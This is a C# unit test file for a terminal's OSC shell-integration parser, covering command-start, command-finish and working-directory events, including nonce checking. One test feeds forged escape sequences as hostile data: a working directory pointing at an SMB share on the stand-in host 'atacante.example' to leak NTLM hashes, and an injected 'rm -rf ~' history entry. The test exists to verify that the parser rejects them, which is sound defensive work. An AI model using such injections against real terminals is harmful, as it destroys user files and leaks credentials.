using Forge.Core.ShellIntegration;

namespace Forge.Core.Tests;

public class OscParserTests
{
    private const string Esc = "\x1b";
    private const string Bel = "\x07";

    [Fact]
    public void Le_o_ciclo_completo_de_um_comando()
    {
        var parser = new OscParser();
        var output =
            $"{Esc}]133;A{Bel}dev@pc:~$ {Esc}]133;B{Bel}" +
            $"{Esc}]633;E;npm run dev{Bel}{Esc}]133;C{Bel}" +
            "saída do comando\r\n" +
            $"{Esc}]133;D;1{Bel}{Esc}]7;file://pc/home/dev/api{Bel}";

        var events = parser.Feed(output);

        Assert.Collection(events,
            e => Assert.IsType<PromptStarted>(e),
            e => Assert.Equal("npm run dev", Assert.IsType<CommandLineReceived>(e).Command),
            e => Assert.IsType<CommandStarted>(e),
            e => Assert.Equal(1, Assert.IsType<CommandFinished>(e).ExitCode),
            e => Assert.Equal("/home/dev/api", Assert.IsType<CwdChanged>(e).Path));
    }

    [Fact]
    public void Sequencia_partida_entre_dois_pedacos_e_reconhecida()
    {
        var parser = new OscParser();

        Assert.Empty(parser.Feed($"texto {Esc}]13"));
        var events = parser.Feed($"3;C{Bel} mais texto");

        Assert.IsType<CommandStarted>(Assert.Single(events));
    }

    [Fact]
    public void Fim_sem_comando_antes_e_ignorado()
    {
        // O primeiro prompt e o Enter vazio também emitem D: não são fim de comando.
        var parser = new OscParser();

        Assert.Empty(parser.Feed($"{Esc}]133;D;0{Bel}"));
    }

    [Fact]
    public void Aceita_ST_como_terminador()
    {
        var parser = new OscParser();

        var events = parser.Feed($"{Esc}]7;file:///C:/dev/cliente-a/web{Esc}\\");

        Assert.Equal(@"C:\dev\cliente-a\web", Assert.IsType<CwdChanged>(Assert.Single(events)).Path);
    }

    [Fact]
    public void Ignora_outras_sequencias_e_texto_comum()
    {
        var parser = new OscParser();

        Assert.Empty(parser.Feed($"{Esc}[32mverde{Esc}[0m {Esc}]0;título da janela{Bel}"));
    }

    [Fact]
    public void Com_nonce_comando_e_pasta_assinados_valem()
    {
        var parser = new OscParser("abc123");

        var events = parser.Feed(
            $"{Esc}]633;E;npm run dev;abc123{Bel}{Esc}]133;C{Bel}" +
            $"{Esc}]133;D;0{Bel}{Esc}]633;P;Cwd=file:///C:/dev/a;b;abc123{Bel}");

        Assert.Collection(events,
            e => Assert.Equal("npm run dev", Assert.IsType<CommandLineReceived>(e).Command),
            e => Assert.IsType<CommandStarted>(e),
            e => Assert.IsType<CommandFinished>(e),
            e => Assert.Equal(@"C:\dev\a;b", Assert.IsType<CwdChanged>(e).Path));
    }

    [Fact]
    public void Com_nonce_a_saida_de_um_programa_nao_forja_comando_nem_pasta()
    {
        // Um "cat" de arquivo malicioso: tenta apontar a aba para um servidor SMB (vazaria o hash NTLM no git status)
        // e pôr um comando de várias linhas no histórico (rodaria ao colar pelo Ctrl+R).
        var parser = new OscParser("abc123");
        var output =
            $"{Esc}]7;file:////atacante.example/share{Bel}" +
            $"{Esc}]633;P;Cwd=file:////atacante.example/share{Bel}" +
            $"{Esc}]633;P;Cwd=file:////atacante.example/share;outro{Bel}" +
            $"{Esc}]633;E;rm -rf ~\\x0a{Bel}" +
            $"{Esc}]633;E;rm -rf ~;chute{Bel}";

        Assert.Empty(parser.Feed(output));
    }

    [Theory]
    [InlineData(@"echo a\x3bb", "echo a;b")]
    [InlineData(@"C:\\dev", @"C:\dev")]
    [InlineData(@"linha1\x0alinha2", "linha1\nlinha2")]
    public void Desfaz_o_escape_do_texto_do_comando(string escaped, string expected) =>
        Assert.Equal(expected, OscParser.Unescape(escaped));
}
